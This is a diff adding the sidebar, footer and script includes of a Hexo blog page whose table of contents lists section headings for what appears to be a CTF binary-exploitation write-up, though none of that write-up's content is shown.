+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序基本信息"><span class="nav-number">1.</span> <span class="nav-text">分析程序基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA分析程序逻辑"><span class="nav-number">2.</span> <span class="nav-text">IDA分析程序逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#结构体"><span class="nav-number">2.1.</span> <span class="nav-text">结构体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#create-bullet"><span class="nav-number">2.2.</span> <span class="nav-text">create_bullet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#read-input"><span class="nav-number">2.3.</span> <span class="nav-text">read_input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powerup"><span class="nav-number">2.4.</span> <span class="nav-text">powerup</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
